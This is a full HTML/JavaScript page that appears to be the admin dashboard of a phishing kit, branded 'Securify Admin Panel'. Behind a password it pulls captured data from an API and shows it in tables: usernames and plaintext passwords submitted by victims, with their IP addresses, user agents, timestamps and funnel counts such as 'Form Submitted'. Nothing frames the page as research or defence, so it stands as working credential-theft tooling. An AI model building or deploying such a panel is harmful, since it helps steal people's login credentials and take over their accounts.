<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #0f0f0f;
      color: #e0e0e0;
      min-height: 100vh;
    }

    /* Login screen */
    #loginScreen {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
      gap: 16px;
    }
    #loginScreen h2 { font-size: 22px; color: #fff; margin-bottom: 8px; }
    #loginScreen input {
      padding: 12px 16px;
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 8px;
      color: #fff;
      font-size: 15px;
      width: 280px;
      outline: none;
    }
    #loginScreen button {
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 12px 40px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      width: 280px;
    }
    #loginScreen button:hover { background: #0081d6; }
    #loginError { color: #ff4444; font-size: 13px; display: none; }

    /* Dashboard */
    #dashboard { display: none; }

    header {
      background: #1a1a1a;
      border-bottom: 1px solid #2a2a2a;
      padding: 16px 28px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header h1 { font-size: 18px; font-weight: 700; color: #fff; }
    header span { font-size: 13px; color: #888; }
    #refreshBtn {
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 6px;
      padding: 8px 18px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
    }

    /* Stats cards */
    .stats {
      display: flex;
      gap: 16px;
      padding: 24px 28px 0;
      flex-wrap: wrap;
    }
    .stat-card {
      background: #1a1a1a;
      border: 1px solid #2a2a2a;
      border-radius: 12px;
      padding: 20px 28px;
      flex: 1;
      min-width: 160px;
    }
    .stat-card .label { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
    .stat-card .value { font-size: 32px; font-weight: 700; color: #fff; }
    .stat-card .value.green { color: #4bb543; }
    .stat-card .value.blue { color: #0095f6; }
    .stat-card .value.orange { color: #f09433; }

    /* Tabs */
    .tabs {
      display: flex;
      gap: 4px;
      padding: 24px 28px 0;
      border-bottom: 1px solid #2a2a2a;
    }
    .tab {
      padding: 10px 20px;
      border-radius: 8px 8px 0 0;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #888;
      border: none;
      background: none;
      border-bottom: 3px solid transparent;
    }
    .tab.active { color: #0095f6; border-bottom: 3px solid #0095f6; }
    .tab:hover:not(.active) { color: #ccc; }

    /* Tables */
    .section { display: none; padding: 24px 28px; }
    .section.active { display: block; }

    .search-bar {
      margin-bottom: 16px;
      display: flex;
      gap: 10px;
      align-items: center;
    }
    .search-bar input {
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 8px;
      color: #fff;
      padding: 9px 14px;
      font-size: 14px;
      outline: none;
      width: 280px;
    }
    .search-bar span { font-size: 13px; color: #888; }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }
    thead tr { background: #1e1e1e; }
    th {
      padding: 12px 14px;
      text-align: left;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: #888;
      font-weight: 600;
    }
    td {
      padding: 12px 14px;
      border-bottom: 1px solid #1e1e1e;
      color: #ccc;
      word-break: break-all;
    }
    tr:hover td { background: #1a1a1a; }
    .badge {
      display: inline-block;
      padding: 3px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
    }
    .badge-login { background: #1a3a1a; color: #4bb543; }
    .badge-secure { background: #1a2a3a; color: #0095f6; }
    .pw { font-family: monospace; color: #f09433; }
    .ip { font-family: monospace; color: #888; font-size: 12px; }
    .time { font-size: 12px; color: #666; }
    .empty { text-align: center; padding: 60px; color: #555; font-size: 15px; }

    /* Loading */
    .loading { text-align: center; padding: 60px; color: #555; }
    .spinner-big {
      width: 36px; height: 36px;
      border: 3px solid #2a2a2a;
      border-top-color: #0095f6;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 12px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <!-- Login Screen -->
  <div id="loginScreen">
    <h2>🔐 Admin Panel</h2>
    <p style="font-size:13px;color:#666;text-align:center">Enter your admin password to continue</p>
    <input type="password" id="secretInput" placeholder="Admin password" onkeydown="if(event.key==='Enter')doLogin()">
    <button onclick="doLogin()">Access Panel</button>
    <p id="loginError">Wrong password. Try again.</p>
  </div>

  <!-- Dashboard -->
  <div id="dashboard">
    <header>
      <h1>📊 Securify Admin Panel</h1>
      <div style="display:flex;align-items:center;gap:12px">
        <span id="lastRefresh"></span>
        <button id="refreshBtn" onclick="loadData()">⟳ Refresh</button>
      </div>
    </header>

    <div class="stats">
      <div class="stat-card">
        <div class="label">Total Visits</div>
        <div class="value blue" id="statVisits">—</div>
      </div>
      <div class="stat-card">
        <div class="label">Login Page Hits</div>
        <div class="value orange" id="statLoginHits">—</div>
      </div>
      <div class="stat-card">
        <div class="label">Form Submitted</div>
        <div class="value green" id="statCreds">—</div>
      </div>
      <div class="stat-card">
        <div class="label">Reached Secure Page</div>
        <div class="value blue" id="statSecure">—</div>
      </div>
    </div>

    <div class="tabs">
      <button class="tab active" onclick="switchTab('credentials')">🗝 Credentials</button>
      <button class="tab" onclick="switchTab('visits')">👁 Visits</button>
    </div>

    <div class="section active" id="credentials">
      <div class="search-bar">
        <input type="text" id="credSearch" placeholder="Search username..." oninput="filterTable('credTable', this.value)">
        <span id="credCount"></span>
      </div>
      <div id="credLoading" class="loading"><div class="spinner-big"></div>Loading...</div>
      <div id="credTableWrap" style="display:none; overflow-x:auto;">
        <table id="credTable">
          <thead>
            <tr>
              <th>#</th>
              <th>Username</th>
              <th>Password</th>
              <th>IP Address</th>
              <th>Timestamp</th>
            </tr>
          </thead>
          <tbody id="credBody"></tbody>
        </table>
      </div>
    </div>

    <div class="section" id="visits">
      <div class="search-bar">
        <input type="text" id="visitSearch" placeholder="Search IP or page..." oninput="filterTable('visitTable', this.value)">
        <span id="visitCount"></span>
      </div>
      <div id="visitLoading" class="loading"><div class="spinner-big"></div>Loading...</div>
      <div id="visitTableWrap" style="display:none; overflow-x:auto;">
        <table id="visitTable">
          <thead>
            <tr>
              <th>#</th>
              <th>Page</th>
              <th>IP Address</th>
              <th>User Agent</th>
              <th>Timestamp</th>
            </tr>
          </thead>
          <tbody id="visitBody"></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    let adminSecret = "";

    function doLogin() {
      const val = document.getElementById("secretInput").value.trim();
      if (!val) return;
      adminSecret = val;
      document.getElementById("loginScreen").style.display = "none";
      document.getElementById("dashboard").style.display = "block";
      loadData();
    }

    function switchTab(tab) {
      document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
      document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
      event.target.classList.add("active");
      document.getElementById(tab).classList.add("active");
    }

    function formatTime(ts) {
      const d = new Date(ts);
      return d.toLocaleString("en-IN", { dateStyle: "medium", timeStyle: "short" });
    }

    function truncate(str, n) {
      return str && str.length > n ? str.slice(0, n) + "…" : str;
    }

    function filterTable(tableId, query) {
      const q = query.toLowerCase();
      const rows = document.querySelectorAll(`#${tableId} tbody tr`);
      rows.forEach(row => {
        row.style.display = row.textContent.toLowerCase().includes(q) ? "" : "none";
      });
    }

    async function loadData() {
      document.getElementById("credLoading").style.display = "block";
      document.getElementById("credTableWrap").style.display = "none";
      document.getElementById("visitLoading").style.display = "block";
      document.getElementById("visitTableWrap").style.display = "none";

      try {
        const res = await fetch("/api/admin", {
          headers: { "x-admin-secret": adminSecret }
        });

        if (res.status === 401) {
          alert("Wrong password!");
          document.getElementById("loginScreen").style.display = "flex";
          document.getElementById("dashboard").style.display = "none";
          return;
        }

        const data = await res.json();

        // Stats
        const loginVisits = data.visits.filter(v => v.page === "login").length;
        const secureVisits = data.visits.filter(v => v.page === "secure").length;
        document.getElementById("statVisits").textContent = data.stats.totalVisits;
        document.getElementById("statLoginHits").textContent = loginVisits;
        document.getElementById("statCreds").textContent = data.stats.totalCredentials;
        document.getElementById("statSecure").textContent = secureVisits;

        // Credentials table
        const credBody = document.getElementById("credBody");
        credBody.innerHTML = "";
        if (data.credentials.length === 0) {
          credBody.innerHTML = '<tr><td colspan="5" class="empty">No credentials yet</td></tr>';
        } else {
          data.credentials.forEach((c, i) => {
            credBody.innerHTML += `
              <tr>
                <td style="color:#555">${i + 1}</td>
                <td><strong style="color:#fff">${c.username}</strong></td>
                <td class="pw">${c.password}</td>
                <td class="ip">${c.ip}</td>
                <td class="time">${formatTime(c.timestamp)}</td>
              </tr>`;
          });
        }
        document.getElementById("credCount").textContent = `${data.credentials.length} records`;
        document.getElementById("credLoading").style.display = "none";
        document.getElementById("credTableWrap").style.display = "block";

        // Visits table
        const visitBody = document.getElementById("visitBody");
        visitBody.innerHTML = "";
        if (data.visits.length === 0) {
          visitBody.innerHTML = '<tr><td colspan="5" class="empty">No visits yet</td></tr>';
        } else {
          data.visits.forEach((v, i) => {
            const badgeClass = v.page === "secure" ? "badge-secure" : "badge-login";
            visitBody.innerHTML += `
              <tr>
                <td style="color:#555">${i + 1}</td>
                <td><span class="badge ${badgeClass}">${v.page}</span></td>
                <td class="ip">${v.ip}</td>
                <td class="time">${truncate(v.userAgent, 60)}</td>
                <td class="time">${formatTime(v.timestamp)}</td>
              </tr>`;
          });
        }
        document.getElementById("visitCount").textContent = `${data.visits.length} records`;
        document.getElementById("visitLoading").style.display = "none";
        document.getElementById("visitTableWrap").style.display = "block";

        document.getElementById("lastRefresh").textContent = "Updated: " + new Date().toLocaleTimeString();

      } catch (err) {
        alert("Error loading data. Check your connection.");
        console.error(err);
      }
    }
  </script>
</body>
</html>
